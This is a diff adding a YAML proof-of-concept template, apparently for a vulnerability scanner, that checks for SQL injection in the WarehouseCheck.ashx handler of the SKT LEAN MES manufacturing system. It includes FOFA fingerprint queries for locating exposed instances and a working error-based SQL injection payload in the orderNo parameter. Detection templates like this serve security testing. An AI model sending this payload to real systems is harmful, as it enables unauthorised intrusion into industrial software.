@@ -1,0 +1,18 @@
+id: poc-yaml-skt-lean-mes-warehousecheck-ashx-sqli
+info:
+  name: 深科特 LEAN MES系统 WarehouseCheck.ashx SQL注入漏洞
+  severity: high
+  tags:
+  - SQL注入
+  finger: lean-mes
+  fofa_1: title="LEAN MES - 用户登录" || body="Content/js/skt.utility.checkmobile.js"
+  fofa_2: body="../MobileApp/VerifyError.aspx" || body="Content/login/login2/multiplant_top.png"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /Handler/WarehouseCheck.ashx?api=GetGrnInfoList&orderNo='+AND+9173+IN+(SELECT+(sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))))+AND+'rhYc'='rhYc&itemCode=1
+  expression: status_code == 500 && contains(body,"0x" + t2) && contains(body,"SqlException")
+    && matches(body,"转换成数据类型(.*?)时失败") && matches(body,"在将(.*?)值")
+transport: http
